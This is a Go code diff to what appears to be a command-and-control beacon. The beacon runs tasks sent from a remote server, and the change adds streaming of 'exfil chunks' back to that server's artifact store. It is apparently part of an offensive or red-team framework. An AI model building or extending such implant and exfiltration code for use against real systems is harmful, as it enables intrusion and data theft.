@@ -181,7 +181,7 @@ func (b *Beacon) runOnce(ctx context.Context) error {
 			b.log.Printf("dropping non-task frame: %v", err)
 			continue
 		}
-		outcome, output := b.runner.Dispatch(ctx, task.GetVerb(), task.GetArguments())
+		outcome, output, chunks := b.runner.Dispatch(ctx, task.GetVerb(), task.GetArguments())
 		result := &rodpb.TaskResult{
 			TaskId:  task.GetTaskId(),
 			Outcome: outcome,
@@ -192,8 +192,22 @@ func (b *Beacon) runOnce(ctx context.Context) error {
 			b.log.Printf("marshal result: %v", err)
 			continue
 		}
-		if err := stream.Send(&rodpb.Frame{Payload: resultPayload}); err != nil {
+		if err := stream.Send(&rodpb.Frame{Payload: resultPayload, Kind: rodpb.FrameKind_FRAME_KIND_TASK_RESULT}); err != nil {
 			return fmt.Errorf("send result: %w", err)
+		}
+		// Out-of-band exfil chunks follow the TaskResult on the same stream.
+		// Each carries the task id so the server reassembles and routes them to
+		// the artifact store (architecture.md Sec 10.1 exfil, Sec 11).
+		for _, chunk := range chunks {
+			chunk.TaskId = task.GetTaskId()
+			chunkPayload, err := proto.Marshal(&chunk)
+			if err != nil {
+				b.log.Printf("marshal exfil chunk: %v", err)
+				break
+			}
+			if err := stream.Send(&rodpb.Frame{Payload: chunkPayload, Kind: rodpb.FrameKind_FRAME_KIND_EXFIL_CHUNK}); err != nil {
+				return fmt.Errorf("send exfil chunk: %w", err)
+			}
 		}
 	}
 }
